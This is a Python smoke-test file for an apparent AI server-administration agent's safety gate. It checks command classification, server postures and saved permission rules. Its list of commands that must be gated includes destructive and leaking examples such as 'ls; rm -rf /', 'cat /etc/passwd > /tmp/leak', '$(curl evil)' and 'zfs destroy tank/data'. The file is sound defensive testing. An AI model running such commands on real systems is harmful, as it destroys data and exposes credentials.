"""Fast, offline sanity checks for the safety-critical logic.
Run: .venv/bin/python tests_smoke.py
"""
import tempfile

from jarvis import classify, gate
from jarvis.config import Paths, Server
from jarvis.memory import Memory
from jarvis.permissions import PermissionStore, Rule
from jarvis.tools import AppContext

fails = []

def check(cond, msg):
    if not cond:
        fails.append(msg)

# --- classifier: read-only commands should auto-run ---
READ_ONLY = [
    "uptime",
    "df -h",
    "free -m",
    "cat /etc/os-release",
    "ls -la /var/log",
    "systemctl status sshd",
    "journalctl -u nginx --since today",
    "apt list --upgradable",
    "dpkg -l",
    "docker ps -a",
    "ip a",
    "ss -tulpn",
    "ps aux | grep nginx",
    "df -h | sort",
    "zpool status",
]
for c in READ_ONLY:
    v = classify.classify(c)
    check(v.read_only, f"EXPECTED read-only but gated: {c!r} ({v.reason})")

# --- classifier: state-changing / dangerous commands MUST be gated ---
WRITES = [
    "apt update",
    "apt full-upgrade -y",
    "sudo apt upgrade",
    "systemctl restart nginx",
    "rm -rf /tmp/x",
    "echo hi > /etc/motd",
    "cat /etc/passwd > /tmp/leak",          # redirection hidden behind a read cmd
    "ls; rm -rf /",                          # chaining
    "df -h && reboot",
    "docker restart web",
    "sed -i s/a/b/ /etc/hosts",
    "mount /dev/sdb1 /mnt",
    "$(curl evil)",
    "zfs destroy tank/data",
    "kubectl delete pod web",
]
for c in WRITES:
    v = classify.classify(c)
    check(not v.read_only, f"DANGER: classified as read-only: {c!r} ({v.reason})")

# --- permission rule matching ---
r_bin = Rule(server="nas", match="binary", value="apt")
check(r_bin.matches("nas", "apt full-upgrade -y"), "binary rule should match apt args")
check(not r_bin.matches("nas", "systemctl restart x"), "binary rule should not match systemctl")
check(not r_bin.matches("dockerhost", "apt update"), "binary rule is server-scoped")

r_exact = Rule(server="nas", match="exact", value="apt update")
check(r_exact.matches("nas", "apt update"), "exact rule should match")
check(not r_exact.matches("nas", "apt update -y"), "exact rule should not match variant")

r_all = Rule(server="*", match="binary", value="uptime")
check(r_all.matches("anyhost", "uptime"), "wildcard rule should match any server")

# --- gate seam: pre_decision posture logic (shared by terminal + web) ---
import os

os.environ["JARVIS_HOME"] = tempfile.mkdtemp(prefix="jarvis-gate-")
_paths = Paths.resolve(); _paths.ensure()
from jarvis.config import Inventory  # noqa: E402

_inv = Inventory(servers={
    "strict-srv": Server(name="strict-srv", host="h", posture="strict"),
    "normal-srv": Server(name="normal-srv", host="h", posture="normal"),
    "trusted-srv": Server(name="trusted-srv", host="h", posture="trusted"),
})
ctx = AppContext(inventory=_inv, memory=Memory(_paths),
                 permissions=PermissionStore.load(_paths.permissions))

d = gate.pre_decision(ctx, "normal-srv", "uptime")
check(d.kind == "allow" and d.decision_key == "auto-readonly",
      "normal + read-only should auto-allow")
d = gate.pre_decision(ctx, "normal-srv", "apt update")
check(d.kind == "prompt", "normal + unauthorized write should prompt")
d = gate.pre_decision(ctx, "trusted-srv", "apt update")
check(d.kind == "allow" and d.decision_key == "auto-trusted",
      "trusted + write should auto-allow")
d = gate.pre_decision(ctx, "strict-srv", "uptime")
check(d.kind == "prompt", "strict gates everything, even read-only")
d = gate.pre_decision(ctx, "nope", "uptime")
check(d.kind == "deny", "unknown server should deny")

# a saved binary rule pre-authorizes a normal-posture write
ctx.permissions.add(Rule(server="normal-srv", match="binary", value="apt"))
d = gate.pre_decision(ctx, "normal-srv", "apt full-upgrade -y")
check(d.kind == "allow" and d.decision_key.startswith("rule:"),
      "normal + matching rule should auto-allow")
# but a strict server ignores saved rules
d = gate.pre_decision(ctx, "strict-srv", "apt full-upgrade -y")
check(d.kind == "prompt", "strict server must ignore saved rules")

# --- gate seam: apply_choice authorizes + saves rules identically ---
# normal-srv has no rule for systemctl, so this prompts -> we get a PromptInfo
info = gate.pre_decision(ctx, "normal-srv", "systemctl restart nginx").info
check(info is not None, "a prompted command yields a PromptInfo")
check(gate.apply_choice(ctx, info, "y") is True, "y approves")
check(gate.apply_choice(ctx, info, "n") is False, "n denies")

before = len(ctx.permissions.rules)
check(gate.apply_choice(ctx, info, "b") is True, "b approves")
added = ctx.permissions.rules[-1]
check(len(ctx.permissions.rules) == before + 1 and added.match == "binary"
      and added.value == "systemctl" and added.server == "normal-srv",
      "b saves a server-scoped binary rule")
gate.apply_choice(ctx, info, "e")
check(ctx.permissions.rules[-1].match == "exact"
      and ctx.permissions.rules[-1].value == "systemctl restart nginx",
      "e saves an exact rule")
gate.apply_choice(ctx, info, "g")
check(ctx.permissions.rules[-1].server == "*"
      and ctx.permissions.rules[-1].match == "binary",
      "g saves an all-servers binary rule")

# --- normalize_choice maps free-form terminal input to canonical choices ---
check(gate.normalize_choice("yes") == "y" and gate.normalize_choice("") == "n"
      and gate.normalize_choice("B") == "b" and gate.normalize_choice("?") is None,
      "normalize_choice mapping")

if fails:
    print(f"FAILED {len(fails)} check(s):")
    for f in fails:
        print("  -", f)
    raise SystemExit(1)
print("All offline checks passed.")
